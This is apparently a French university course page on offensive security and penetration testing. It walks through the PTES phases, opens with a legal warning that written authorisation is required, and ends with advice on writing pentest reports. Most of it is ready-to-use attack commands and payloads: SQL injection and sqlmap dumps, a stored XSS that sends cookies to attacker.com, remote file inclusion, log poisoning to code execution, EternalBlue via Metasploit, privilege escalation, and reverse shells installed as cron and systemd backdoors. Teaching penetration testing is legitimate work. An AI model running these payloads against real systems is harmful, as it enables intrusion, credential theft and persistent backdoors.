---
layout: course
title: "Sécurité offensive"
semestre: "S7"
type_cours: "cybersec"
tags: ["pentest", "OSINT", "Nmap", "Metasploit", "Burp Suite", "SQLi", "XSS", "exploitation", "CTF"]
---

## Introduction

La sécurité offensive consiste à adopter la posture d'un attaquant pour identifier les vulnérabilités avant qu'elles ne soient exploitées. Toute démarche offensive doit être **autorisée par écrit** — hors de ce cadre, c'est un délit pénal.

> **Rappel légal :** L'accès non autorisé à un système informatique est punissable de 2 à 5 ans d'emprisonnement (art. 323-1 CP). Toujours obtenir un **ordre de mission** signé.

---

## Méthodologie PTES

**Penetration Testing Execution Standard** — 7 phases :

| Phase | Description |
|-------|-------------|
| 1. Pre-engagement | Scope, autorisation, règles d'engagement |
| 2. Intelligence Gathering | OSINT, reconnaissance passive |
| 3. Threat Modeling | Identification des actifs et vecteurs d'attaque |
| 4. Vulnerability Analysis | Scan, enumération, identification des CVE |
| 5. Exploitation | Exploitation des vulnérabilités identifiées |
| 6. Post-exploitation | Persistance, pivoting, exfiltration |
| 7. Reporting | Documentation technique et synthèse executive |

---

## Phase 1 — Reconnaissance

### Reconnaissance passive (OSINT)

Ne touche pas la cible directement — sources publiques.

```bash
# DNS — informations sur le domaine
whois target.com
dig target.com ANY
dig +short target.com MX
dig +axfr target.com @ns1.target.com   # Tentative de transfert de zone

# Sous-domaines — enumération passive
subfinder -d target.com -o subdomains.txt
amass enum -passive -d target.com

# Certificats (Certificate Transparency)
# https://crt.sh/?q=%.target.com
curl -s "https://crt.sh/?q=%.target.com&output=json" | jq '.[].name_value' | sort -u

# Technologies web
whatweb https://target.com
wappalyzer (extension navigateur)

# Google Dorks
site:target.com filetype:pdf
site:target.com intitle:"index of"
site:target.com inurl:admin
"target.com" ext:sql OR ext:bak OR ext:config

# Shodan — systèmes exposés
shodan search "hostname:target.com"
shodan host 1.2.3.4

# theHarvester — emails, sous-domaines
theHarvester -d target.com -b google,bing,linkedin,hunter
```

### Reconnaissance active

```bash
# Nmap — scan de base
nmap -sn 192.168.1.0/24                # Ping sweep
nmap -sV -sC -O -T4 192.168.1.1       # Version + scripts + OS
nmap -p- --min-rate 5000 192.168.1.1  # Tous les ports

# Scan furtif (SYN scan)
nmap -sS -p 1-1024 192.168.1.1

# Nmap scripts NSE utiles
nmap --script vuln 192.168.1.1                      # CVE connus
nmap --script smb-vuln-ms17-010 192.168.1.1          # EternalBlue
nmap --script http-enum 192.168.1.1 -p 80,443        # Répertoires web
nmap --script ssh-hostkey 192.168.1.1 -p 22          # Clés SSH

# Masscan — scan rapide (réseau large)
masscan -p 80,443,22,21,3389 10.0.0.0/16 --rate=10000
```

---

## Phase 2 — Enumération

### Services courants

```bash
# FTP (port 21)
nmap --script ftp-anon,ftp-brute -p 21 target

# SMB/Windows (ports 139, 445)
enum4linux -a 192.168.1.10
smbclient -L //192.168.1.10 -N
smbmap -H 192.168.1.10

# LDAP (port 389)
ldapsearch -x -H ldap://192.168.1.10 -b "dc=target,dc=com"

# Web — répertoires et fichiers
gobuster dir -u https://target.com -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
ffuf -w wordlist.txt -u https://target.com/FUZZ -mc 200,301,302

# DNS zone transfer
fierce --domain target.com
dnsrecon -d target.com -t axfr
```

---

## Phase 3 — Exploitation Web (OWASP Top 10)

### A01 — Injection SQL

```bash
# Test manuel : input → ' OR '1'='1
# Erreur : "You have an error in your SQL syntax"

# Test basique dans l'URL
https://target.com/product?id=1'
https://target.com/product?id=1 OR 1=1--
https://target.com/product?id=1 UNION SELECT NULL,NULL,NULL--

# Extraction de données via UNION
https://target.com/product?id=0 UNION SELECT username,password,NULL FROM users--

# sqlmap — automatisation
sqlmap -u "https://target.com/product?id=1" --dbs
sqlmap -u "https://target.com/product?id=1" -D webapp --tables
sqlmap -u "https://target.com/product?id=1" -D webapp -T users --dump
sqlmap -u "https://target.com/product?id=1" --os-shell   # Shell si DBA
sqlmap -r request.txt --level=5 --risk=3               # Depuis Burp request
```

### A02 — XSS (Cross-Site Scripting)

```javascript
// XSS Reflected — paramètre GET/POST non filtré
https://target.com/search?q=<script>alert('XSS')</script>
https://target.com/search?q=<img src=x onerror=alert(document.cookie)>

// XSS Stocké — commentaire/forum
<script>
  fetch('https://attacker.com/steal?c=' + document.cookie);
</script>

// Bypass de filtre naïf
<sCrIpT>alert(1)</sCrIpT>
<img src=1 onerror="&#97;lert(1)">
"><svg onload=alert(1)>
javascript:alert(1)

// XSS DOM
document.write('<img src="' + location.hash.substring(1) + '">')
// URL : https://target.com/#"><img src=x onerror=alert(1)>
```

### A03 — Path Traversal / LFI

```bash
# Local File Inclusion
https://target.com/page?file=../../../etc/passwd
https://target.com/page?file=....//....//....//etc/passwd  # Filtre bypass
https://target.com/page?file=php://filter/convert.base64-encode/resource=config.php

# RFI — Remote File Inclusion (si allow_url_include=On)
https://target.com/page?file=http://attacker.com/shell.php

# Log Poisoning → RCE via LFI
# 1. Poisonner le log Apache : curl -A "<?php system($_GET['cmd']); ?>" http://target.com
# 2. Inclure : ?file=/var/log/apache2/access.log&cmd=id
```

### A04 — SSRF (Server-Side Request Forgery)

```bash
# Accéder aux services internes
https://target.com/fetch?url=http://169.254.169.254/latest/meta-data/  # AWS metadata
https://target.com/fetch?url=http://localhost:8080/admin
https://target.com/fetch?url=file:///etc/passwd

# Bypass de filtres
https://target.com/fetch?url=http://127.1/admin        # 127.1 = 127.0.0.1
https://target.com/fetch?url=http://0x7f000001/admin   # Hex
https://target.com/fetch?url=http://2130706433/admin   # Décimal
```

---

## Phase 4 — Exploitation avec Metasploit

```bash
# Démarrage
msfconsole

# Rechercher un exploit
msf> search type:exploit platform:windows ms17-010
msf> use exploit/windows/smb/ms17_010_eternalblue

# Configuration
msf> set RHOSTS 192.168.1.100
msf> set LHOST 192.168.1.50
msf> set LPORT 4444
msf> set PAYLOAD windows/x64/meterpreter/reverse_tcp
msf> check     # Vérifier si la cible est vulnérable
msf> exploit

# Meterpreter — post-exploitation
meterpreter> sysinfo
meterpreter> getuid
meterpreter> getsystem           # Élévation de privilèges
meterpreter> hashdump            # Dump des hashes NTLM
meterpreter> upload /tmp/tool.exe C:\\Windows\\Temp\\
meterpreter> shell               # Shell interactif
meterpreter> run post/multi/recon/local_exploit_suggester
```

---

## Phase 5 — Post-exploitation

### Élévation de privilèges Linux

```bash
# Sudo mal configuré
sudo -l
sudo /usr/bin/find . -exec /bin/bash \;   # Si find est dans sudoers

# SUID binaires
find / -perm -4000 -type f 2>/dev/null
# /usr/bin/nmap avec --interactive → !sh
# /usr/bin/vim → :!/bin/bash

# Cron jobs modifiables
cat /etc/crontab
ls -la /etc/cron.*
# Si script cron writable par nous → injecter reverse shell

# Capabilities
getcap -r / 2>/dev/null
# cap_setuid+ep sur python3 → import os; os.setuid(0); os.system("/bin/bash")

# GTFObins : https://gtfobins.github.io
```

### Persistance

```bash
# Ajout de clé SSH
echo "ssh-rsa AAAA..." >> /root/.ssh/authorized_keys

# Tâche cron
(crontab -l; echo "* * * * * /bin/bash -c 'bash -i >& /dev/tcp/10.0.0.1/4444 0>&1'") | crontab -

# Service systemd malveillant
cat > /etc/systemd/system/backdoor.service << EOF
[Unit]
After=network.target
[Service]
ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/10.0.0.1/4444 0>&1'
Restart=always
[Install]
WantedBy=multi-user.target
EOF
systemctl enable backdoor
```

---

## Burp Suite — Proxy d'interception

```
Navigateur ──────► Burp Proxy (127.0.0.1:8080) ──────► Application Web
                           │
                    Intercept / Modify
                    Repeater / Intruder
                    Scanner (Pro)
```

**Fonctionnalités clés :**

| Module | Usage |
|--------|-------|
| **Proxy** | Intercepter et modifier les requêtes |
| **Repeater** | Rejouer et modifier manuellement |
| **Intruder** | Fuzzing, brute-force, injection |
| **Scanner** | Détection automatique de vulnérabilités (Pro) |
| **Decoder** | Encode/décode Base64, URL, HTML, Hex |
| **Comparer** | Diff de deux réponses |

---

## Rapport de Pentest

### Structure standard

1. **Page de garde** : périmètre, date, commanditaire
2. **Résumé exécutif** : risque global, principales vulnérabilités (sans jargon)
3. **Méthodologie** : outils, phases, tests effectués
4. **Vulnérabilités** (pour chaque finding) :
   - Titre et sévérité (Critique/Haute/Moyenne/Faible/Info)
   - Score CVSS v3.1
   - Description technique
   - Preuves (captures, payloads)
   - Impact business
   - Recommandation
5. **Annexes** : logs, commandes complètes

> La sévérité doit être **justifiée par l'impact réel**, pas juste le score CVSS théorique.
